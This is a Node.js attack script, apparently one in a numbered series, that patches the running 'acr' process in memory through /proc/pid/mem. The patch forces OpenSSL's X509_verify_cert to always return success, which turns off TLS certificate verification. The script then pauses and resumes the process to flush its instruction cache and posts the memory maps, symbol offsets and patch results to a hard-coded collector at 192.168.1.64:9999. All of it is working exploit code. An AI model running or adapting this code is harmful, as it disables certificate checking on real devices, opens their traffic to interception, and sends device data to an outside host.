"use strict";
// audit107.js - patch X509_verify_cert in libcrypto to always return 1.
// This bypasses ALL cert verification at the OpenSSL library level.
// Also force I-cache flush via SIGSTOP/SIGCONT on acr.
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

var out = {};
out.started = new Date().toISOString();

out.pidof = sh("pidof acr", 200);
var pid = trim(out.pidof).match(/^(\d+)/);
pid = pid ? pid[1] : null;
out.pid = pid;

if (!pid) {
    out.status = "NO_ACR";
    post("/p107_diag", out);
    post("/p107_done", { started: out.started });
} else {
    // find libcrypto base
    out.maps = sh("cat /proc/" + pid + "/maps | grep libcrypto | head -3", 500);
    var cryptoBase = null;
    out.maps.split("\n").forEach(function (L) {
        var m = L.match(/^([0-9a-f]+)-[0-9a-f]+ r-xp 00000000 .*libcrypto/);
        if (m && !cryptoBase) cryptoBase = parseInt(m[1], 16);
    });
    out.crypto_base = cryptoBase ? "0x" + cryptoBase.toString(16) : "NOT_FOUND";

    // find X509_verify_cert offset in libcrypto via readelf/nm
    out.nm = sh("readelf -s /usr/lib/libcrypto.so.1.0.0 2>/dev/null | grep -i 'X509_verify_cert' | head -5", 1500);
    out.nm2 = sh("nm -D /usr/lib/libcrypto.so.1.0.0 2>/dev/null | grep -i 'X509_verify_cert' | head -5", 1500);

    // also find SSL_CTX_set_cert_verify_callback in libssl
    out.ssl_maps = sh("cat /proc/" + pid + "/maps | grep libssl | head -3", 500);
    var sslBase = null;
    out.ssl_maps.split("\n").forEach(function (L) {
        var m = L.match(/^([0-9a-f]+)-[0-9a-f]+ r-xp 00000000 .*libssl/);
        if (m && !sslBase) sslBase = parseInt(m[1], 16);
    });
    out.ssl_base = sslBase ? "0x" + sslBase.toString(16) : "NOT_FOUND";

    // parse nm output to get offset
    var verifyOff = null;
    out.nm.split("\n").forEach(function (L) {
        var m = L.match(/\s+([0-9a-f]+)\s+\d+\s+FUNC\s+GLOBAL\s+DEFAULT\s+\d+\s+X509_verify_cert/);
        if (m) verifyOff = parseInt(m[1], 16);
    });
    if (!verifyOff) {
        out.nm2.split("\n").forEach(function (L) {
            var m = L.match(/([0-9a-f]+)\s+T\s+X509_verify_cert/);
            if (m) verifyOff = parseInt(m[1], 16);
        });
    }

    if (cryptoBase && verifyOff) {
        var verifyAddr = cryptoBase + verifyOff;
        out.verify_addr = "0x" + verifyAddr.toString(16);

        // patch to movs r0,#1 ; bx lr
        sh("printf '\\x01\\x20\\x70\\x47' > /tmp/.p80stub", 100);
        var before = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + verifyAddr + " count=4 2>/dev/null | od -An -tx1", 120));
        var wr = trim(sh("dd if=/tmp/.p80stub of=/proc/" + pid + "/mem bs=1 seek=" + verifyAddr + " count=4 conv=notrunc 2>&1 | tail -1", 120));
        var after = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + verifyAddr + " count=4 2>/dev/null | od -An -tx1", 120));
        out.x509_patch = { addr: "0x" + verifyAddr.toString(16), before: before, write: wr, after: after,
                           ok: after.indexOf("01 20 70 47") >= 0 };
    } else {
        out.x509_patch = "COULD_NOT_FIND_SYMBOL (cryptoBase=" + !!cryptoBase + " verifyOff=" + verifyOff + ")";
    }

    // force I-cache flush via SIGSTOP/SIGCONT
    out.sigstop = sh("kill -STOP " + pid + " 2>&1; sleep 0.1; kill -CONT " + pid + " 2>&1; echo FLUSHED", 200);

    // re-verify the callback patches
    out.reverify = sh("dd if=/proc/" + pid + "/mem bs=1 skip=$((0x96c08)) count=4 2>/dev/null | od -An -tx1", 120);
    out.reverify2 = sh("dd if=/proc/" + pid + "/mem bs=1 skip=$((0x97c84)) count=4 2>/dev/null | od -An -tx1", 120);

    post("/p107_patch", out);
    post("/p107_done", { started: out.started });
}
